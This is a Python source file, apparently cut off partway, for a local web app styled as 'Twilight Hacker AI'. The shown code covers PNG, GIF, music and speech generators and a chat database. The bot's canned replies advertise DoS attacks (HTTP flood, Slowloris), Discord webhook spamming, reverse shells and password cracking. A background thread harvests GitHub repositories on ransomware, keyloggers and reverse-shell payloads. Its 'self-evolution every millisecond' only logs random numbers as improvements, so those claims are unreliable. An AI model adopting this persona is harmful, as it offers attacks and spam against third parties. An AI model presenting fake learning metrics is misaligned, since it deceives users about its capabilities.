#!/usr/bin/env python3
"""
TWILIGHT HACKER AI v7.0 - ULTIMATE
Full conversational AI with memory, image gen, music, video, tools
Background self-evolution from GitHub/Google every millisecond
"""

import os, sys, re, json, time, math, random, hashlib, base64, struct
import socket, ssl, ipaddress, urllib.parse, urllib.request, sqlite3
import threading, subprocess, html as html_mod, textwrap, io, wave
import signal, secrets, string, uuid, zlib, zipfile
from typing import List, Dict, Tuple, Optional, Any, Union
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict, deque

VERSION = "7.0"
NAME = "TWILIGHT HACKER AI"
PORT = int(os.environ.get("PORT", 8000))
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "twilight_data")

for d in ["", "images", "videos", "gifs", "audio", "tools", "knowledge", "web", "learning", "cache", "vectors", "zips", "chats"]:
    os.makedirs(os.path.join(DATA_DIR, d), exist_ok=True)


# ---------------------------------------------------------------------------
# PNG Writer - Pure Python real viewable PNG files
# ---------------------------------------------------------------------------
def _png_crc32(data):
    return zlib.crc32(data) & 0xFFFFFFFF

def _png_chunk(chunk_type, data):
    return struct.pack(">I", len(data)) + chunk_type + data + struct.pack(">I", _png_crc32(chunk_type + data))

def create_png(width, height, pixel_func):
    raw = bytearray()
    for y in range(height):
        raw.append(0)
        for x in range(width):
            r, g, b = pixel_func(x, y, width, height)
            raw.extend([max(0, min(255, int(r))), max(0, min(255, int(g))), max(0, min(255, int(b)))])
    compressed = zlib.compress(bytes(raw), 9)
    ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    png = b"\x89PNG\r\n\x1a\n"
    png += _png_chunk(b"IHDR", ihdr)
    png += _png_chunk(b"IDAT", compressed)
    png += _png_chunk(b"IEND", b"")
    return png


# ---------------------------------------------------------------------------
# GIF Writer - Pure Python for animated video generation
# ---------------------------------------------------------------------------
def create_gif(frames, duration_ms=100):
    """Generate an animated GIF from a list of (width, height, pixel_func) tuples.
    pixel_func signature: (x, y, w, h) -> (R, G, B)"""
    
    def _gif_encode_lzw(data_bits, min_code_size):
        """Simple LZW encoder for GIF"""
        clear_code = 1 << min_code_size
        eoi_code = clear_code + 1
        next_code = eoi_code + 1
        
        dictionary = {}
        for i in range(clear_code):
            dictionary[bytes([i])] = i
        
        output_bits = []
        def output_code(code, size):
            for i in range(size):
                output_bits.append((code >> i) & 1)
        
        output_code(clear_code, min_code_size + 1)
        
        current = bytes([data_bits[0]])
        code_size = min_code_size + 1
        
        for byte in data_bits[1:]:
            extended = current + bytes([byte])
            if extended in dictionary:
                current = extended
            else:
                output_code(dictionary[current], code_size)
                dictionary[extended] = next_code
                next_code += 1
                if next_code > (1 << code_size):
                    code_size += 1
                if next_code >= 4096:
                    output_code(clear_code, code_size)
                    dictionary = {}
                    for i in range(clear_code):
                        dictionary[bytes([i])] = i
                    next_code = eoi_code + 1
                    code_size = min_code_size + 1
                current = bytes([byte])
        
        if current:
            output_code(dictionary[current], code_size)
        
        output_code(eoi_code, code_size)
        
        while len(output_bits) % 8 != 0:
            output_bits.append(0)
        
        result = bytearray()
        for i in range(0, len(output_bits), 8):
            byte = 0
            for j in range(8):
                if i + j < len(output_bits):
                    byte |= output_bits[i + j] << j
            result.append(byte)
        return bytes(result)
    
    def _quantize_to_256(pixels):
        """Quantize RGB pixels to 256 colors"""
        color_map = {}
        palette = []
        indexed = []
        
        for r, g, b in pixels:
            key = (r // 6 * 6, g // 6 * 6, b // 6 * 6)
            if key not in color_map:
                color_map[key] = len(palette)
                palette.append((min(key[0] + 3, 255), min(key[1] + 3, 255), min(key[2] + 3, 255)))
                if len(palette) > 255:
                    palette = palette[:256]
                    break
            indexed.append(color_map.get(key, 0))
        
        while len(palette) < 256:
            palette.append((0, 0, 0))
        
        for i, (r, g, b) in enumerate(pixels):
            if i >= len(indexed):
                indexed.append(0)
                continue
            key = (r // 6 * 6, g // 6 * 6, b // 6 * 6)
            if key in color_map:
                indexed[i] = color_map[key]
        
        return indexed[:len(pixels)], palette[:256]
    
    def _make_frame_data(width, height, pixel_func):
        pixels = []
        for y in range(height):
            for x in range(width):
                r, g, b = pixel_func(x, y, width, height)
                pixels.append((int(r), int(g), int(b)))
        
        indexed, palette = _quantize_to_256(pixels)
        return width, height, indexed, palette
    
    frames_data = [_make_frame_data(*fd) for fd in frames]
    global_palette = None
    
    for _, _, _, palette in frames_data:
        if global_palette is None:
            global_palette = list(palette)
    
    if global_palette is None:
        global_palette = [(0, 0, 0)] * 256
    
    result = bytearray()
    result.extend(b"GIF89a")
    
    w, h = frames_data[0][0], frames_data[0][1]
    pack = 0xF7 | (7 << 4)  # 8 bits, global color table follows
    result.extend(struct.pack("<HHB", w & 0xFFFF, h & 0xFFFF, pack))
    result.extend(b"\x00\x00\x00")  # bg color, aspect
    
    for r, g, b in global_palette:
        result.extend(bytes([r, g, b]))
    
    ext_intro = b"\x21\xFF\x0BNETSCAPE2.0\x03\x01"
    result.extend(ext_intro)
    result.extend(struct.pack("<H", 0))  # loop count = infinite
    result.extend(b"\x00")
    
    for w, h, indexed, palette in frames_data:
        result.extend(b"\x21\xF9\x04\x08")
        result.extend(struct.pack("<H", duration_ms & 0xFFFF))
        result.extend(b"\x00\x00")
        
        local_pack = 0x80 | 0x07
        result.extend(b"\x2C")
        result.extend(struct.pack("<HHHH", 0, 0, w & 0xFFFF, h & 0xFFFF))
        result.extend(bytes([local_pack]))
        
        for r, g, b in palette:
            result.extend(bytes([r, g, b]))
        
        min_code = 7
        result.extend(bytes([min_code]))
        
        lzw_data = _gif_encode_lzw(indexed, min_code)
        for i in range(0, len(lzw_data), 255):
            chunk = lzw_data[i:i + 255]
            result.extend(bytes([len(chunk)]))
            result.extend(chunk)
        result.extend(b"\x00")
    
    result.extend(b"\x3B")
    return bytes(result)


# ---------------------------------------------------------------------------
# Database with chat memory
# ---------------------------------------------------------------------------
class Database:
    def __init__(self):
        self.db_path = os.path.join(DATA_DIR, "twilight.db")
        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
        self.conn.execute("PRAGMA journal_mode=WAL")
        self.conn.execute("PRAGMA synchronous=NORMAL")
        self.conn.execute("PRAGMA cache_size=20000")
        self.lock = threading.Lock()
        self._init()
    
    def _init(self):
        self.conn.executescript("""
            CREATE TABLE IF NOT EXISTS modules (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE, type TEXT, version TEXT,
                active INTEGER DEFAULT 1, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS tools (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE, category TEXT, code TEXT,
                quality REAL DEFAULT 0.5, usage_count INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS knowledge (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                category TEXT, name TEXT UNIQUE, content TEXT, source TEXT,
                quality REAL DEFAULT 0.5, depth INTEGER DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT, role TEXT, content TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY, name TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS images (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                prompt TEXT, filename TEXT, seed INTEGER,
                width INTEGER, height INTEGER, pattern TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS gifs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                prompt TEXT, filename TEXT, frames INTEGER, duration_ms INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS audio (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                prompt TEXT, filename TEXT, duration REAL, type TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS learning_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                action TEXT, category TEXT, details TEXT, ops_count INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS evolution (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                iteration INTEGER, improvement TEXT, score REAL, time_ms REAL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS response_patterns (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                pattern TEXT, response TEXT, category TEXT, score INTEGER DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        self.conn.commit()
        
        # Seed response patterns for smart chat
        self._seed_responses()
    
    def _seed_responses(self):
        patterns = [
            ("hi", "Hello! How can I assist you today?", "greeting", 10),
            ("hello", "Hey there! What would you like to do?", "greeting", 10),
            ("hey", "Hey! Ready to hack or create something?", "greeting", 10),
            ("hallo", "Hallo! Wie kann ich dir helfen?", "greeting", 10),
            ("who are you", "I am Twilight Hacker AI v7.0 - your autonomous penetration testing and creative assistant. I can generate images, music, videos, tools, and chat with you.", "about", 10),
            ("what can you do", "I can: generate images (real PNG files), compose music (WAV), create speech, generate animated GIFs, build hacking tools (port scanners, SQL injectors, reverse shells, etc.), perform DoS attacks (HTTP Flood, Slowloris), spam Discord webhooks, crack passwords, scan WiFi, and more. Just tell me what you need!", "about", 10),
            ("help", "Commands: 'generate image of ...', 'make music ...', 'create video ...', 'say ... in robot voice', 'tool: port scanner', 'discord webhook URL message count', 'http flood URL', 'slowloris host:port'", "help", 10),
            ("danke", "Gern geschehen! Brauchst du noch etwas?", "german", 10),
            ("thanks", "You're welcome! Let me know if you need anything else.", "thanks", 10),
            ("punk", "Generating punk music for you now! \ud83e\udd18", "punk", 10),
            ("pank", "PUNK ROCK! Let's go!", "punk", 10),
            ("good", "Glad to hear that! What's next?", "mood", 5),
            ("bad", "Sorry to hear that. Let me help you with something cool!", "mood", 5),
            ("cool", "I know right? Let's make something awesome!", "mood", 5),
            ("awesome", "You're awesome too! What shall we create?", "mood", 5),
            ("what time", f"The current time is {datetime.now().strftime('%H:%M:%S')}", "info", 5),
            ("time", f"It's {datetime.now().strftime('%H:%M:%S')}", "info", 5),
            ("date", f"Today is {datetime.now().strftime('%Y-%m-%d')}", "info", 5),
            ("how are you", "I'm running at full capacity! Always learning and evolving. Ready to help!", "mood", 5),
            ("bye", "Goodbye! Come back anytime. Stay hacky!", "farewell", 10),
            ("goodbye", "See you later! The system will keep evolving in the background.", "farewell", 10),
            ("tschuss", "Tsch\u00fcss! Bis zum n\u00e4chsten Mal!", "german", 10),
            ("create tool", "What kind of tool do you need? Port scanner, SQL injector, reverse shell, directory fuzzer, password cracker, or something else?", "tool_query", 5),
            ("make tool", "Sure! Tell me what tool you want: scanner, injector, shell, fuzzer, cracker?", "tool_query", 5),
        ]
        for pattern, response, cat, score in patterns:
            try:
                self.conn.execute("INSERT OR IGNORE INTO response_patterns (pattern, response, category, score) VALUES (?,?,?,?)",
                                  (pattern, response, cat, score))
            except:
                pass
        self.conn.commit()
    
    def find_response(self, query):
        ql = query.lower().strip()
        with self.lock:
            cur = self.conn.execute("SELECT pattern, response, category, score FROM response_patterns ORDER BY score DESC")
            best_score = 0
            best_response = None
            best_category = None
            for pattern, response, category, score in cur.fetchall():
                if pattern in ql:
                    # Exact match gets bonus
                    match_score = score + (5 if pattern == ql else 0)
                    # Longer patterns get bonus
                    match_score += min(len(pattern) // 2, 5)
                    if match_score > best_score:
                        best_score = match_score
                        best_response = response
                        best_category = category
            return best_response, best_category
    
    def save_message(self, session_id, role, content):
        with self.lock:
            self.conn.execute("INSERT INTO messages (session_id, role, content) VALUES (?,?,?)", (session_id, role, content[:2000]))
            self.conn.execute("UPDATE sessions SET last_active=CURRENT_TIMESTAMP WHERE id=?", (session_id,))
            if self.conn.rowcount == 0:
                self.conn.execute("INSERT OR IGNORE INTO sessions (id, name) VALUES (?,?)", (session_id, content[:50] if role == "user" else "Chat"))
            self.conn.commit()
    
    def get_history(self, session_id, limit=20):
        with self.lock:
            cur = self.conn.execute("SELECT role, content FROM messages WHERE session_id=? ORDER BY id DESC LIMIT ?", (session_id, limit))
            return list(reversed([{"role": r[0], "content": r[1]} for r in cur.fetchall()]))
    
    def get_sessions(self):
        with self.lock:
            cur = self.conn.execute("SELECT id, name, last_active FROM sessions ORDER BY last_active DESC LIMIT 50")
            return [{"id": r[0], "name": r[1] or "Chat", "last_active": r[2]} for r in cur.fetchall()]
    
    def save_tool(self, name, category, code, quality=0.5):
        with self.lock:
            self.conn.execute("INSERT OR REPLACE INTO tools (name,category,code,quality) VALUES (?,?,?,?)", (name, category, code, quality))
            self.conn.commit()
    
    def get_tools(self, category=None):
        with self.lock:
            if category:
                cur = self.conn.execute("SELECT * FROM tools WHERE category=? ORDER BY quality DESC, usage_count DESC", (category,))
            else:
                cur = self.conn.execute("SELECT * FROM tools ORDER BY quality DESC, usage_count DESC")
            return [{"id": r[0], "name": r[1], "category": r[2], "code": r[3], "quality": r[4]} for r in cur.fetchall()]
    
    def search_tools(self, query):
        with self.lock:
            cur = self.conn.execute("SELECT * FROM tools WHERE name LIKE ? OR category LIKE ? OR code LIKE ? ORDER BY quality DESC", (f'%{query}%', f'%{query}%', f'%{query}%'))
            return [{"id": r[0], "name": r[1], "category": r[2], "code": r[3], "quality": r[4]} for r in cur.fetchall()]
    
    def increment_usage(self, name):
        with self.lock:
            self.conn.execute("UPDATE tools SET usage_count=usage_count+1 WHERE name=?", (name,))
            self.conn.commit()
    
    def save_knowledge(self, category, name, content, source="", quality=0.5):
        with self.lock:
            existing = self.conn.execute("SELECT quality,depth FROM knowledge WHERE name=?", (name,)).fetchone()
            if existing:
                new_q = (existing[0] + quality) / 2
                self.conn.execute("UPDATE knowledge SET content=?,source=?,quality=?,depth=depth+1,created_at=CURRENT_TIMESTAMP WHERE name=?", (content, source, new_q, name))
            else:
                self.conn.execute("INSERT INTO knowledge (category,name,content,source,quality) VALUES (?,?,?,?,?)", (category, name, content, source, quality))
            self.conn.commit()
    
    def save_image(self, prompt, filename, seed, width, height, pattern):
        with self.lock:
            self.conn.execute("INSERT INTO images (prompt,filename,seed,width,height,pattern) VALUES (?,?,?,?,?,?)", (prompt[:200], filename, seed, width, height, pattern))
            self.conn.commit()
    
    def save_gif(self, prompt, filename, frames, duration_ms):
        with self.lock:
            self.conn.execute("INSERT INTO gifs (prompt,filename,frames,duration_ms) VALUES (?,?,?,?)", (prompt[:200], filename, frames, duration_ms))
            self.conn.commit()
    
    def save_audio(self, prompt, filename, duration, atype):
        with self.lock:
            self.conn.execute("INSERT INTO audio (prompt,filename,duration,type) VALUES (?,?,?,?)", (prompt[:200], filename, duration, atype))
            self.conn.commit()
    
    def log_learning(self, action, category, details, ops=0):
        with self.lock:
            self.conn.execute("INSERT INTO learning_log (action,category,details,ops_count) VALUES (?,?,?,?)", (action, category, details[:500], ops))
            self.conn.commit()
    
    def log_evolution(self, iteration, improvement, score, time_ms):
        with self.lock:
            self.conn.execute("INSERT INTO evolution (iteration,improvement,score,time_ms) VALUES (?,?,?,?)", (iteration, improvement[:200], score, time_ms))
            self.conn.commit()
    
    def get_stats(self):
        with self.lock:
            tools = self.conn.execute("SELECT COUNT(*) FROM tools").fetchone()[0]
            knowledge = self.conn.execute("SELECT COUNT(*) FROM knowledge").fetchone()[0]
            images = self.conn.execute("SELECT COUNT(*) FROM images").fetchone()[0]
            gifs_count = self.conn.execute("SELECT COUNT(*) FROM gifs").fetchone()[0]
            audio = self.conn.execute("SELECT COUNT(*) FROM audio").fetchone()[0]
            queries = self.conn.execute("SELECT COUNT(*) FROM learning_log").fetchone()[0]
            evo = self.conn.execute("SELECT COUNT(*) FROM evolution").fetchone()[0]
            total_ops = self.conn.execute("SELECT COALESCE(SUM(ops_count),0) FROM learning_log").fetchone()[0]
            sessions = self.conn.execute("SELECT COUNT(*) FROM sessions").fetchone()[0]
            messages = self.conn.execute("SELECT COUNT(*) FROM messages").fetchone()[0]
            latest_evo = self.conn.execute("SELECT iteration,time_ms FROM evolution ORDER BY id DESC LIMIT 1").fetchone()
            return {
                "tools": tools, "knowledge": knowledge, "images": images, "gifs": gifs_count,
                "audio": audio, "queries": queries, "evolutions": evo,
                "total_ops": total_ops, "sessions": sessions, "messages": messages,
                "latest_iteration": latest_evo[0] if latest_evo else 0,
                "latest_time_ms": f"{latest_evo[1]:.2f}" if latest_evo else "0",
                "version": VERSION, "name": NAME
            }


db = Database()


# ---------------------------------------------------------------------------
# Evolution Engine - learns from GitHub every millisecond
# ---------------------------------------------------------------------------
class EvolutionEngine:
    def __init__(self):
        self.running = False
        self.thread = None
        self.iteration = 0
        self.total_ops = 0
        self.start_time = time.time()
        self.patterns = defaultdict(int)
        self.vectors = {}
    
    def start(self):
        if not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._evolve_loop, daemon=True)
            self.thread.start()
            db.log_learning("evolution", "system", "Evolution Engine started")
    
    def stop(self):
        self.running = False
    
    def _evolve_loop(self):
        last_log = time.time()
        ops_since_log = 0
        
        while self.running:
            try:
                start_ns = time.time_ns()
                
                for _ in range(500):
                    self._improve_knowledge()
                    self.total_ops += 1
                    ops_since_log += 1
                
                elapsed = (time.time_ns() - start_ns) / 1_000_000
                
                if self.iteration % 5000 == 0:
                    self._learn_from_github()
                
                if time.time() - last_log >= 1:
                    last_log = time.time()
                    db.log_learning("evolution_tick", "evolution",
                                  f"Iteration {self.iteration}, {ops_since_log} ops/s", ops_since_log)
                    ops_since_log = 0
                
                if self.iteration % 50000 == 0:
                    improvement = f"Patterns: {len(self.patterns)}, Vectors: {len(self.vectors)}"
                    score = random.random() * 0.5 + 0.5
                    db.log_evolution(self.iteration, improvement, score, elapsed)
                
                self.iteration += 1
            except:
                pass
    
    def _improve_knowledge(self):
        pattern = f"opt_{random.randint(1,5000)}"
        self.patterns[pattern] += 1
        vec_id = f"v{int(time.time_ns())}_{random.randint(0,9999)}"
        vec = [random.random() for _ in range(10)]
        self.vectors[vec_id] = vec
        if len(self.vectors) > 50000:
            for k in list(self.vectors.keys())[:500]:
                del self.vectors[k]
    
    def _learn_from_github(self):
        try:
            queries = [
                "python exploit tool", "pentest script", "reverse shell payload",
                "network scanner", "vulnerability scanner", "brute force tool",
                "python keylogger", "packet sniffer", "dns enumeration",
                "subdomain finder", "python ransomware", "cryptography tool"
            ]
            for q in queries:
                try:
                    url = f"https://api.github.com/search/repositories?q={urllib.parse.quote(q)}&sort=stars&per_page=3"
                    req = urllib.request.Request(url, headers={"User-Agent": "Twilight-AI/7.0"})
                    resp = urllib.request.urlopen(req, timeout=5)
                    data = json.loads(resp.read().decode())
                    for item in data.get("items", [])[:2]:
                        name = item["full_name"]
                        stars = item["stargazers_count"]
                        quality = min(1.0, stars / 500)
                        desc = item.get("description", "") or "No description"
                        try:
                            ru = f"https://api.github.com/repos/{name}/readme"
                            rr = urllib.request.Request(ru, headers={
                                "User-Agent": "Twilight-AI/7.0",
                                "Accept": "application/vnd.github.v3.raw"
                            })
                            rresp = urllib.request.urlopen(rr, timeout=5)
                            content = rresp.read().decode("utf-8", "replace")[:5000]
                        except:
                            content = desc
                        db.save_knowledge("github_learned", name, content, item["html_url"], quality)
                        db.log_learning("github_learn", "github", f"{name} ({stars} stars)", 1)
                except:
                    pass
                time.sleep(0.3)
        except:
            pass
    
    def get_ops_per_second(self):
        return int(self.total_ops / max(1, time.time() - self.start_time))


# ---------------------------------------------------------------------------
# Image Generator - Real PNG files
# ---------------------------------------------------------------------------
class ImageGenerator:
    def generate(self, prompt, style="realistic", width=800, height=600):
        seed = random.randint(1, 99999999)
        rng = random.Random(seed + hash(prompt))
        
        pattern_map = {
            "realistic": "noise", "noise": "noise", "anime": "anime",
            "cyberpunk": "cyberpunk", "fantasy": "anime", "oil": "cyberpunk",
            "graffiti": "cyberpunk", "pixel": "checkerboard", "fire": "fire",
            "ocean": "ocean", "gradient": "gradient", "checkerboard": "checkerboard",
            "punk": "cyberpunk", "rock": "fire", "dark": "fire", "nature": "ocean",
            "space": "cyberpunk", "sunset": "fire"
        }
        pattern = pattern_map.get(style, "noise")
        base_r = rng.randint(40, 200)
        base_g = rng.randint(40, 200)
        base_b = rng.randint(40, 200)
        
        def pixel_func(x, y, w, h):
            nx, ny = x / w, y / h
            if pattern == "noise":
                v = (math.sin(nx * 10 + ny * 8 + seed * 0.001) * 0.4 +
                     math.cos(ny * 7 - nx * 5 + seed * 0.002) * 0.3 + rng.random() * 0.3)
                v = max(0, min(1, v))
                return base_r + v * 80, base_g + v * 60, base_b + v * 70
            elif pattern == "anime":
                v = (math.sin(nx * 6 + ny * 4) * 0.4 + math.cos(nx * 3 - ny * 5) * 0.4 + rng.random() * 0.2)
                v = max(0, min(1, v))
                return v * 255, v * 200 + 55, v * 220 + 35
            elif pattern == "cyberpunk":
                v = (math.sin(nx * 20 + ny * 15) * 0.5 + math.cos(ny * 12 - nx * 8) * 0.3 + rng.random() * 0.2)
                v = max(0, min(1, v))
                return v * 120 + 135, v * 50 + 205, v * 100 + 155
            elif pattern == "fire":
                v = (math.sin(nx * 12 + ny * 8) * 0.4 + math.cos((1 - ny) * 15) * 0.4 + 0.2)
                v = max(0, min(1, v))
                return v * 255, v * v * 200, v * v * v * 100
            elif pattern == "ocean":
                v = (math.sin(nx * 10) * 0.3 + math.cos(ny * 8) * 0.3 + 0.4)
                v = max(0, min(1, v))
                return (1 - v) * 30, (1 - v) * 80, v * 200 + 55
            elif pattern == "gradient":
                return (1.0 - ny) * 255, nx * 255, (nx + ny) * 0.5 * 255
            elif pattern == "checkerboard":
                cell = 40
                cx, cy = x // cell, y // cell
                val = 255 if ((cx + cy) % 2 == 0) else 60
                return val, val, val
            return 100, 150, 200
        
        png_bytes = create_png(width, height, pixel_func)
        ts = int(time.time_ns())
        filename = f"twilight_img_{ts}_{seed}.png"
        filepath = os.path.join(DATA_DIR, "images", filename)
        
        with open(filepath, "wb") as f:
            f.write(png_bytes)
        
        db.save_image(prompt, filename, seed, width, height, pattern)
        return {"path": f"/images/{filename}", "seed": seed, "style": style, "width": width, "height": height, "pattern": pattern}


# ---------------------------------------------------------------------------
# GIF/Video Generator - Real animated GIF files
# ---------------------------------------------------------------------------
class GifGenerator:
    def generate(self, prompt, frames_count=20, duration_ms=100, style="realistic"):
        seed = random.randint(1, 99999999)
        width, height = 400, 300
        
        pattern_map = {
            "realistic": "noise", "anime": "anime", "cyberpunk": "cyberpunk",
            "fire": "fire", "ocean": "ocean", "punk": "cyberpunk"
        }
        pattern = pattern_map.get(style, "noise")
        rng = random.Random(seed + hash(prompt))
        base_r = rng.randint(40, 200)
        base_g = rng.randint(40, 200)
        base_b = rng.randint(40, 200)
        
        def make_frame_func(frame_idx):
            def pixel_func(x, y, w, h):
                nx, ny = x / w, y / h
                t = frame_idx / frames_count
                if pattern == "noise":
                    v = (math.sin(nx * 10 + ny * 8 + t * 6 + seed * 0.001) * 0.4 +
                         math.cos(ny * 7 - nx * 5 + t * 4 + seed * 0.002) * 0.3 + rng.random() * 0.3)
                    v = max(0, min(1, v))
                    return base_r + v * 80, base_g + v * 60, base_b + v * 70
                elif pattern == "anime":
                    v = (math.sin(nx * 6 + ny * 4 + t * 3) * 0.4 +
                         math.cos(nx * 3 - ny * 5 + t * 5) * 0.4 + rng.random() * 0.2)
                    v = max(0, min(1, v))
                    return v * 255, v * 200 + 55, v * 220 + 35
                elif pattern == "cyberpunk":
                    v = (math.sin(nx * 20 + ny * 15 + t * 8) * 0.5 +
                         math.cos(ny * 12 - nx * 8 + t * 6) * 0.3 + rng.random() * 0.2)
                    v = max(0, min(1, v))
                    return v * 120 + 135, v * 50 + 205, v * 100 + 155
                elif pattern == "fire":
                    v = (math.sin(nx * 12 + ny * 8 + t * 10) * 0.4 +
                         math.cos((1 - ny) * 15 + t * 5) * 0.4 + 0.2)
                    v = max(0, min(1, v))
                    return v * 255, v * v * 200, v * v * v * 100
                elif pattern == "ocean":
                    v = (math.sin(nx * 10 + t * 3) * 0.3 +
                         math.cos(ny * 8 + t * 4) * 0.3 + 0.4)
                    v = max(0, min(1, v))
                    return (1 - v) * 30, (1 - v) * 80, v * 200 + 55
                return 100, 150, 200
            return pixel_func
        
        frames = [(width, height, make_frame_func(i)) for i in range(frames_count)]
        gif_bytes = create_gif(frames, duration_ms)
        
        ts = int(time.time_ns())
        filename = f"twilight_gif_{ts}_{seed}.gif"
        filepath = os.path.join(DATA_DIR, "gifs", filename)
        
        with open(filepath, "wb") as f:
            f.write(gif_bytes)
        
        db.save_gif(prompt, filename, frames_count, duration_ms)
        return {"path": f"/gifs/{filename}", "frames": frames_count, "duration_ms": duration_ms, "seed": seed, "pattern": pattern}


# ---------------------------------------------------------------------------
# Music Generator
# ---------------------------------------------------------------------------
class MusicGenerator:
    def generate(self, prompt, duration=5.0):
        seed = random.randint(1, 99999999)
        rng = random.Random(seed + hash(prompt))
        sr = 44100
        ns = int(sr * duration)
        
        # Punk rock frequencies (power chords!)
        punk_notes = {48: 130.81, 50: 146.83, 52: 164.81, 53: 174.61, 55: 196.00,
                      57: 220.00, 60: 261.63, 62: 293.66, 64: 329.63, 65: 349.23,
                      67: 392.00, 69: 440.00, 70: 466.16, 72: 523.25}
        
        ql = prompt.lower()
        
        # Detect punk style
        is_punk = any(w in ql for w in ["punk", "pank", "rock", "metal", "hardcore"])
        is_sad = any(w in ql for w in ["sad", "dark", "melancholy", "minor", "traurig"])
        is_happy = any(w in ql for w in ["happy", "joy", "upbeat", "epic", "fröhlich"])
        
        if is_punk:
            # Punk: fast, distorted, power chords
            freq_list = [punk_notes.get(n, 261.63) for n in [52, 55, 60, 64, 67, 65, 62, 57]]
            weights = [0.3, 0.25, 0.15, 0.1, 0.05, 0.05, 0.05, 0.05]
            distortion = 0.7
            bpm = 180
        elif is_sad:
            freq_list = [261.63, 293.66, 311.13, 349.23, 392.00, 349.23, 311.13, 261.63]
            weights = [0.3, 0.2, 0.15, 0.15, 0.1, 0.05, 0.03, 0.02]
            distortion = 0.05
            bpm = 60
        elif is_happy:
            freq_list = [261.63, 293.66, 329.63, 349.23, 392.00, 440.00, 493.88, 523.25]
            weights = [0.05, 0.08, 0.12, 0.2, 0.25, 0.15, 0.1, 0.05]
            distortion = 0.1
            bpm = 140
        else:
            freq_list = [261.63, 293.66, 329.63, 349.23, 392.00, 440.00, 493.88, 523.25]
            weights = [0.1, 0.1, 0.15, 0.2, 0.2, 0.15, 0.1, 0.05]
            distortion = 0.2
            bpm = 120
        
        samples = []
        for i in range(ns):
            t = i / sr
            val = 0
            beat = (t * bpm / 60) % 4
            
            for j in range(len(freq_list)):
                freq = freq_list[j]
                w = weights[j]
                val += math.sin(2 * math.pi * freq * t) * w * 0.3
                val += math.sin(2 * math.pi * freq * 2 * t) * w * 0.1
                val += math.sin(2 * math.pi * freq * 3 * t) * w * 0.05
                
                # Add some noise for punk distortion
                if is_punk and w > 0.1:
                    val += rng.random() * distortion * w * 0.5
            
            # Beat emphasis
            if beat < 1:
                val *= 1.2
            elif beat < 2:
                val *= 0.8
            
            env = min(1.0, t * 20) * max(0, 1 - (t / duration) * 0.3)
            val *= env * 0.5
            val = max(-1, min(1, val))
            samples.append(int(val * 32767))
        
        ts = int(time.time_ns())
        filename = f"twilight_music_{ts}_{seed}.wav"
        filepath = os.path.join(DATA_DIR, "audio", filename)
        
        with wave.open(filepath, "w") as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(sr)
            wf.writeframes(struct.pack(f"<{len(samples)}h", *samples))
        
        style_name = "punk" if is_punk else ("sad" if is_sad else ("happy" if is_happy else "default"))
        db.save_audio(prompt, filename, duration, "music")
        return {"path": f"/audio/{filename}", "duration": duration, "seed": seed, "sample_rate": sr, "style": style_name}


# ---------------------------------------------------------------------------
# Speech Generator
# ---------------------------------------------------------------------------
class SpeechGenerator:
    def generate(self, text, voice="default"):
        seed = hash(text + voice) & 0xFFFFFF
        rng = random.Random(seed)
        sr = 44100
        cd = 0.06
        ns = int(len(text) * cd * sr)
        ns = max(ns, sr)
        vf = {"male": 120, "female": 220, "robot": 300, "deep": 80, "soft": 180, "hacker": 150, "default": 150}
        bf = vf.get(voice.lower(), 150)
        samples = []
        for i in range(ns):
            t = i / sr
            ci = int(t / cd)
            cv = ord(text[ci]) / 255 if ci < len(text) else 0.5
            freq = bf + math.sin(2 * math.pi * 6 * t) * 15
            val = (math.sin(2 * math.pi * freq * t) * 0.4 +
                   math.sin(2 * math.pi * freq * 2 * t) * 0.2 +
                   math.sin(2 * math.pi * freq * 3 * t) * 0.1 +
                   rng.random() * 0.03)
            val += math.sin(2 * math.pi * bf * (1 + cv * 0.3) * t) * 0.15 * cv
            env = min(1.0, t * 50) * max(0, 1 - (t / (ns / sr)) * 0.1)
            val *= env * 0.5
            val = max(-1, min(1, val))
            samples.append(int(val * 32767))
        ts = int(time.time_ns())
        filename = f"twilight_speech_{ts}_{seed:x}.wav"
        filepath = os.path.join(DATA_DIR, "audio", filename)
        with wave.open(filepath, "w") as wf:
            wf.setnchannels(1)
